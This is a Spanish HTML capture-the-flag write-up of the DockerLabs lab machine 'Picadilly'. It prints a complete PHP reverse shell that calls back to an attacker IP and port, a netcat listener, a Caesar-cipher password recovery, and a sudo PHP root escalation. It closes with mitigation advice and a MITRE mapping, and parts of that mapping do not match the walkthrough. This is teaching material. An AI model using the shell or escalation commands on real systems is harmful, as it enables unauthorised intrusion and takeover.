@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Picadilly | ZsZsec</title>
+<meta content="Autor : ZsZs Plataforma : DockerLabs Nivel : Fácil Tipo : Web + File Upload + Escalada simple+Decrypt 1. Escaneo de Puertos Comenzamos con un escaneo completo de todos los puertos..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">DockerLabs</p>
+<h1>Maquina Picadilly<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / SUID / php</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">SUID</span><span class="tag">php</span><span class="tag">Escalada_Privilegios</span><span class="tag">web</span><span class="tag">decrypt</span><span class="tag">root</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<p><strong>Autor</strong>: ZsZs
+<strong>Plataforma</strong>: DockerLabs
+<strong>Nivel</strong>: Fácil<br/>
+<strong>Tipo</strong>: Web + File Upload + Escalada simple+Decrypt</p>
+<h3>1. <strong>Escaneo de Puertos</strong></h3>
+<p>Comenzamos con un escaneo completo de todos los puertos TCP utilizando <code>nmap</code> con opciones agresivas para detectar servicios rápidamente:</p>
+<pre><code class="language-bash">──(zikuta㉿zikuta)-[~]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 172.17.0.2   
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 20:52 CDT
+Nmap scan report for 172.17.0.2
+Host is up (0.000010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd 2.4.59
+| http-ls: Volume /
+| SIZE  TIME              FILENAME
+| 215   2024-05-18 01:19  backup.txt
+|_
+|_http-title: Index of /
+|_http-server-header: Apache/2.4.59 (Debian)
+443/tcp open  ssl/http Apache httpd 2.4.59 ((Debian))
+|_http-server-header: Apache/2.4.59 (Debian)
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Picadilly
+| ssl-cert: Subject: commonName=50a6ca252ff4
+| Subject Alternative Name: DNS:50a6ca252ff4
+| Not valid before: 2024-05-18T06:29:06
+|_Not valid after:  2034-05-16T06:29:06
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: Host: picadilly.lab
+</code></pre>
+<p>Resultado relevante:</p>
+<pre><code class="language-bash">PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd 2.4.59
+443/tcp open  ssl/http Apache httpd 2.4.59 ((Debian))
+</code></pre>
+<h3><strong>Enumeración del puerto 80 (HTTP)</strong></h3>
+<p>Navegamos a <code>http://172.17.0.2</code> y encontramos un directorio llamado backup.txt que contenia lo siguiente:</p>
+<blockquote>
+</blockquote>
+<p>Esto hace clara referencia al <strong>cifrado César</strong>, creado por Julio César. Procedimos a descifrar el string <code>hdvbfuadcb</code> usando una herramienta online de Caesar Cipher.</p>
+<p>Resultado del descifrado:</p>
+<pre><code class="language-bash">hdvbfuadcb → easycrazy
+</code></pre>
+<p>Por lo tanto, obtenemos credenciales:</p>
+<ul>
+<li><strong>Usuario</strong>: <code>mateo</code></li>
+<li><strong>Contraseña</strong>: <code>easycrazy</code></li>
+</ul>
+<h3><strong>Análisis del puerto 443 (HTTPS)</strong></h3>
+<p>En <code>https://172.17.0.2</code>, encontramos una aplicación web personalizada que mostraba el título "Picadilly" y una funcionalidad de <strong>subida de archivos</strong> (<code>upload.php</code>). Esto nos dio la posibilidad de intentar una <strong>inyección de reverse shell en PHP</strong>.</p>
+<h3><strong>Explotación - File Upload y Reverse Shell</strong></h3>
+<h4>4.1 Preparación de la reverse shell</h4>
+<p>Utilizamos una reverse shell en PHP:</p>
+<pre><code class="language-php">(zikuta㉿zikuta)-[~/Downloads/picadilly]
+└─$ cat shell.php    
+&lt;?php
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '192.168.226.128';
+$port = 4444;
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; sh -i';
+$daemon = 0;
+$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+        $pid = pcntl_fork();
+
+        if ($pid == -1) {
+                printit("ERROR: Can't fork");
+                exit(1);
+        }
+
+        if ($pid) {
+                exit(0);  // Parent exits
+        }
+        if (posix_setsid() == -1) {
+                printit("Error: Can't setsid()");
+                exit(1);
+        }
+
+        $daemon = 1;
+} else {
+        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+chdir("/");
+
+umask(0);
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+        printit("$errstr ($errno)");
+        exit(1);
+}
+
+$descriptorspec = array(
+   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+        printit("ERROR: Can't spawn shell");
+        exit(1);
+}
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+        if (feof($sock)) {
+                printit("ERROR: Shell connection terminated");
+                break;
+        }
+
+        if (feof($pipes[1])) {
+                printit("ERROR: Shell process terminated");
+                break;
+        }
+
+        $read_a = array($sock, $pipes[1], $pipes[2]);
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+        if (in_array($sock, $read_a)) {
+                if ($debug) printit("SOCK READ");
+                $input = fread($sock, $chunk_size);
+                if ($debug) printit("SOCK: $input");
+                fwrite($pipes[0], $input);
+        }
+
+        if (in_array($pipes[1], $read_a)) {
+                if ($debug) printit("STDOUT READ");
+                $input = fread($pipes[1], $chunk_size);
+                if ($debug) printit("STDOUT: $input");
+                fwrite($sock, $input);
+        }
+
+        if (in_array($pipes[2], $read_a)) {
+                if ($debug) printit("STDERR READ");
+                $input = fread($pipes[2], $chunk_size);
+                if ($debug) printit("STDERR: $input");
+                fwrite($sock, $input);
+        }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+function printit ($string) {
+        if (!$daemon) {
+                print "$string\n";
+        }
+}
+
+?&gt;
+                 
+</code></pre>
+<p>Guardamos el archivo como <code>shell.php</code> y lo subimos exitosamente desde el panel de subida.</p>
+<h4>4.2 Acceso a la shell</h4>
+<p>Después de la subida, descubrimos que los archivos eran accesibles vía <code>/uploads/</code>. Entonces accedimos a:</p>
+<pre><code class="language-html">https://172.17.0.2/uploads/shell.php
+</code></pre>
+<p>Antes de eso, pusimos un listener en nuestra máquina:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Downloads/picadilly]
+└─$ nc -lvnp 4444  
+listening on [any] 4444 ...
+connect to [192.168.226.128] from (UNKNOWN) [172.17.0.2] 56668
+Linux f702455fe6bd 6.12.13-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.13-1kali1 (2025-02-11) x86_64 GNU/Linux
+ 02:02:24 up 14 min,  0 user,  load average: 2.93, 4.30, 2.21
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<h3><strong>Escalada horizontal a usuario <code>mateo</code></strong></h3>
+<p>Probamos las credenciales que descubrimos previamente (<code>mateo:easycrazy</code>) para cambiar de usuario:</p>
+<pre><code class="language-bash">$ su mateo 
+Password: easycrazy
+ls
+pwd
+/home/mateo
+ls
+whoami
+mateo
+</code></pre>
+<p>Con esto, teníamos acceso como usuario regular.</p>
+<h1><strong>Escalada de privilegios</strong></h1>
+<p>Revisamos los permisos sudo:</p>
+<pre><code class="language-bash">sudo -l
+Matching Defaults entries for mateo on f702455fe6bd:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User mateo may run the following commands on f702455fe6bd:
+    (ALL) NOPASSWD: /usr/bin/php
+
+</code></pre>
+<p>Esto nos da acceso total para ejecutar PHP como root sin contraseña.</p>
+<h3>Explotacion SUID PHP</h3>
+<p>Ejecutamos el siguiente comando:</p>
+<pre><code class="language-bash">sudo /usr/bin/php -r 'system("/bin/bash");'
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+</code></pre>
+<p>Obtenemos acceso como root.</p>
+<h2>Tecnicas Utilizadas</h2>
+<table>
+<thead>
+<tr>
+<th>Técnica</th>
+<th>Explicación</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Nmap Full Scan</strong></td>
+<td>Detección de servicios abiertos y versiones</td>
+</tr>
+<tr>
+<td><strong>Directory Listing Abuse</strong></td>
+<td>Enumeración de archivos expuestos vía HTTP</td>
+</tr>
+<tr>
+<td><strong>Cifrado César</strong></td>
+<td>Decodificación de texto cifrado con desplazamiento</td>
+</tr>
+<tr>
+<td><strong>Upload Vulnerability</strong></td>
+<td>Subida de shell PHP para ejecución remota</td>
+</tr>
+<tr>
+<td><strong>Reverse Shell</strong></td>
+<td>Conexión de regreso hacia el atacante para tomar control</td>
+</tr>
+<tr>
+<td><strong>Credenciales filtradas</strong></td>
+<td>Uso directo de contraseña extraída para escalar usuario</td>
+</tr>
+<tr>
+<td><strong>Sudo abuse</strong></td>
+<td>Escalada de privilegios usando PHP sin contraseña</td>
+</tr>
+</tbody>
+</table>
+<h3><strong>Permisos sudo mal configurados (Sudo Misconfiguration)</strong></h3>
+<h4>Técnica utilizada:</h4>
+<p>El usuario <code>mateo</code> tenía permisos de sudo para ejecutar <code>/usr/bin/php</code> como root sin necesidad de contraseña.</p>
+<h4>Por qué es crítico:</h4>
+<ul>
+<li>Permitir ejecutar intérpretes (como PHP, Python, Perl, etc.) con sudo <strong>es equivalente a regalar acceso root</strong> si no hay restricciones adicionales.</li>
+<li>El atacante puede ejecutar cualquier comando del sistema desde el intérprete.</li>
+</ul>
+<h4>Cómo prevenirlo:</h4>
+<ul>
+<li><strong>Evitar permitir lenguajes de scripting en sudo sin restricciones</strong>.</li>
+<li>Si es necesario usarlos, usar herramientas como <code>sudoers</code> con <code>NOPASSWD</code> pero restringiendo a scripts específicos <strong>sin argumentos variables</strong>, así:</li>
+</ul>
+<h1>MITRE ATTA&amp;CK</h1>
+<table>
+<thead>
+<tr>
+<th><strong>Táctica (Objetivo)</strong></th>
+<th><strong>Técnica (Nombre)</strong></th>
+<th><strong>ID MITRE ATT&amp;CK</strong></th>
+<th><strong>Descripción específica en Picadilly</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Reconocimiento</strong></td>
+<td><em>Gather Victim Host Information</em></td>
+<td>T1592.002</td>
+<td>El escaneo con Nmap reveló servicios (Apache en puertos 80 y 443), sistema operativo (Debian) y versión.</td>
+</tr>
+<tr>
+<td><strong>Descubrimiento</strong></td>
+<td><em>Network Service Discovery</em></td>
+<td>T1046</td>
+<td>Se utilizó <code>nmap</code> con <code>-p-</code> y <code>-sV</code> para detectar todos los servicios disponibles.</td>
+</tr>
+<tr>
+<td><strong>Acceso Inicial</strong></td>
+<td><em>Exploit Public-Facing Application</em></td>
+<td>T1190</td>
+<td>Se explotó la función de subida de archivos en la web (upload.php) para subir una shell PHP.</td>
+</tr>
+<tr>
+<td><strong>Ejecución</strong></td>
+<td><em>Command and Scripting Interpreter: PHP</em></td>
+<td>T1059.005</td>
+<td>Se usó <code>php</code> para ejecutar comandos del sistema y obtener reverse shell.</td>
+</tr>
+<tr>
+<td><strong>Ejecución</strong></td>
+<td><em>Command and Scripting Interpreter: Bash</em></td>
+<td>T1059.004</td>
+<td>Reverse shell se ejecutó con <code>bash -i &gt;&amp; /dev/tcp/...</code> para establecer conexión.</td>
+</tr>
+<tr>
+<td><strong>Persistencia / Privilege Esc.</strong></td>
+<td><em>Valid Accounts</em></td>
+<td>T1078.001</td>
+<td>Uso de credenciales válidas (<code>mateo:easycrazy</code>) encontradas en archivo público para escalar de <code>www-data</code> a <code>mateo</code>.</td>
+</tr>
+<tr>
+<td><strong>Privilege Escalation</strong></td>
+<td><em>Abuse Elevation Control Mechanism: Sudo</em></td>
+<td>T1548.003</td>
+<td>El usuario <code>mateo</code> tenía sudo sin contraseña sobre <code>/usr/bin/php</code>, lo que se abusó para ejecutar comandos como root.</td>
+</tr>
+<tr>
+<td><strong>Defense Evasion</strong></td>
+<td><em>Obfuscated Files or Information</em></td>
+<td>T1027</td>
+<td>La shell PHP fue disfrazada como archivo de apariencia legítima para pasar la validación de upload.</td>
+</tr>
+<tr>
+<td><strong>Command and Control (C2)</strong></td>
+<td><em>Application Layer Protocol: Web Protocols</em></td>
+<td>T1071.001</td>
+<td>La reverse shell fue activada mediante petición HTTP al archivo subido.</td>
+</tr>
+<tr>
+<td><strong>Command and Control (C2)</strong></td>
+<td><em>Ingress Tool Transfer</em></td>
+<td>T1105</td>
+<td>La shell se subió al servidor como archivo <code>.php</code> mediante la funcionalidad vulnerable.</td>
+</tr>
+</tbody>
+</table>
+<h1>Conclusion</h1>
+<p>La máquina <em>Picadilly</em> de DockerLabs demostró ser un entorno excelente para aplicar técnicas de pentesting realistas, desde la enumeración inicial hasta la escalada de privilegios. A lo largo del proceso, se evidenció cómo una configuración débil en la seguridad de servicios web puede permitir accesos no autorizados y comprometer todo el sistema.</p>
+<p>Mediante un escaneo completo de puertos con <code>nmap</code>, se identificaron servicios web en los puertos 80 y 443. En el servicio HTTP se descubrió un archivo público que contenía una contraseña cifrada utilizando el cifrado César, lo que permitió obtener acceso a una cuenta de usuario del sistema. Luego, se detectó una funcionalidad vulnerable de subida de archivos en el sitio HTTPS, la cual permitió la ejecución de una shell PHP remota y el acceso como el usuario <code>www-data</code>.</p>
+<p>Posteriormente, con las credenciales filtradas, se escaló horizontalmente al usuario <code>mateo</code>, quien tenía permisos de <code>sudo</code> para ejecutar PHP como root sin contraseña. Esta configuración incorrecta permitió una escalada directa a privilegios de administrador.</p>
+<p>Durante todo el proceso, se aplicaron técnicas concretas del framework MITRE ATT&amp;CK, como abuso de subida de archivos (<code>T1190</code>), uso de cuentas válidas (<code>T1078.001</code>), abuso de <code>sudo</code> (<code>T1548.003</code>) y ejecución de intérpretes (<code>T1059</code>). Estas acciones reflejan fallas comunes en entornos reales, especialmente en lo relacionado con permisos mal configurados, gestión insegura de contraseñas y validaciones insuficientes en aplicaciones web.</p>
+<p>En conclusión, <em>Picadilly</em> resalta la importancia de fortalecer la seguridad desde múltiples frentes: proteger archivos públicos, validar correctamente los formularios web, restringir el uso de <code>sudo</code>, y aplicar el principio de mínimo privilegio. Estos elementos, cuando son ignorados, se convierten en vectores de ataque que pueden ser explotados incluso por atacantes con conocimientos básicos. Este ejercicio demuestra, una vez más, que la seguridad ofensiva bien practicada es clave para fortalecer defensas efectivas.</p>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
